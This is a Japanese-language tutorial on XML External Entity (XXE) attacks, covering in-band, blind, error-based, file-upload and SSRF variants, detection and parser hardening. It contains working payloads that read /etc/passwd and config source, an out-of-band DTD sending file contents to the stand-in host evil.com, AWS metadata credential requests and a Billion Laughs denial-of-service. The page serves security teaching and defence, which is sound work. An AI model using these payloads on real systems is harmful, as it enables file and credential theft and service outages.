XXE (XML External Entity)

XML パーサーの外部エンティティ処理を悪用し、サーバー上のファイル読み取り、 SSRF、DoS、場合によっては RCE を実現する。

Theory WSA Lab Hands-on

原理と仕組み

XML には DTD (Document Type Definition) で外部エンティティを定義する機能がある。 アプリケーションがユーザー提供の XML を解析する際に外部エンティティの解決を 無効化していないと、攻撃者はサーバーのファイルシステムやネットワークリソースに アクセスできる。 

<!-- XML 外部エンティティの基本構文 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- パーサーが &xxe; を /etc/passwd の内容に展開する -->
XXE の Attack Surface

XML を受け付ける全てのエンドポイントが対象:

  • SOAP API (Content-Type: text/xml)
  • REST API が XML も受け付ける場合
  • ファイルアップロード (SVG, DOCX, XLSX, XML config)
  • RSS/Atom フィードパーサー
  • SAML 認証フロー

種類と分類

1. Classic XXE (In-band)

外部エンティティの内容がレスポンスに直接表示される場合。 

<!-- ファイル読み取り -->
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>

<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">

<!-- ソースコード読み取り (PHP filter) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">

2. Blind XXE (Out-of-Band)

エンティティの内容がレスポンスに表示されない場合。 外部 DTD を利用してデータを攻撃者のサーバーに送信する。 

<!-- 攻撃者のサーバーに外部DTDを配置 (https://evil.com/xxe.dtd) -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://evil.com/?data=%file;'>">
%eval;
%exfiltrate;

<!-- 送信する XML -->
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % dtd SYSTEM "https://evil.com/xxe.dtd">
    %dtd;
]>
<data>test</data>

<!-- 攻撃者のサーバーログに /etc/hostname の内容が記録される -->

3. Error-based XXE

エラーメッセージにファイル内容を含ませる手法。Blind XXE の代替。 

<!-- 外部 DTD (https://evil.com/error.dtd) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

<!-- エラーメッセージ: "File not found: /nonexistent/root:x:0:0:..." -->

4. SVG/DOCX/XLSX as XXE Vector

画像アップロード (SVG) やドキュメント (Office XML) を経由した XXE。 XML パーサーが使われていることに開発者が気づいていないケースが多い。 

<!-- SVG XXE -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <text x="0" y="20">&xxe;</text>
</svg>

<!-- DOCX/XLSX (ZIP 内の XML ファイルを改ざん) -->
# 1. DOCX を展開
unzip document.docx -d doc_extracted
# 2. word/document.xml に XXE ペイロード注入
# 3. 再圧縮
cd doc_extracted && zip -r ../payload.docx .

5. XXE to SSRF

<!-- 内部ネットワークのスキャン -->
<!ENTITY xxe SYSTEM "http://192.168.1.1/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- AWS メタデータ取得 -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

6. Parameter Entity

<!-- 通常のエンティティが禁止されている場合 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://evil.com/collect">
    %xxe;
]>

<!-- Parameter entity は DTD 内でのみ使用可能 (% prefix) -->
<!-- 外部 DTD 内で通常エンティティを定義して使う -->

7. Billion Laughs (DoS)

<!-- エンティティの再帰展開で指数関数的メモリ消費 -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!-- ... 9レベルまで → 10^9 個の "lol" 文字列 -->
]>
<data>&lol9;</data>

検出方法

手法詳細
Content-Type 変更JSON → application/xml に変更してXMLを送信
OOB 検出外部DTDをコールバックサーバー(Burp Collaborator)に向ける
ファイル読み取り/etc/hostname 等の無害なファイルで確認
エラー誘発不正な DTD で XML パーサーのエラーメッセージ確認
ファイル形式確認SVG, DOCX, XLSX アップロード機能を探す
JSON API での XXE テスト
// 元のリクエスト
POST /api/data HTTP/1.1
Content-Type: application/json
{"name": "test"}

// XXE テスト
POST /api/data HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>

防御と Bypass

防御策

  • 外部エンティティの無効化 - パーサー設定で FEATURE_EXTERNAL_GENERAL_ENTITIES = false
  • DTD の無効化 - 完全に DTD 処理を無効化するのが最も安全
  • JSON への移行 - XML を使わない設計
  • 入力検証 - DOCTYPE 宣言を含む XML を拒否
// Java - 安全な設定
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Python - defusedxml
from defusedxml import ElementTree
tree = ElementTree.parse(xml_input)  // XXE 自動防御

// PHP
libxml_disable_entity_loader(true);  // PHP 8.0 以降は不要(デフォルト無効)

Key Takeaways

  • XML を受け付ける箇所は全て XXE の候補: SOAP, SVG upload, DOCX, SAML
  • Blind XXE は OOB で検出: Burp Collaborator / interactsh が必須ツール
  • Content-Type を変えてみる: JSON API でも XML を受け付けることがある
  • XXE → SSRF のチェーン: 内部ネットワークアクセスやクラウドメタデータ取得
  • ファイルアップロードを忘れない: SVG/DOCX が盲点になりやすい
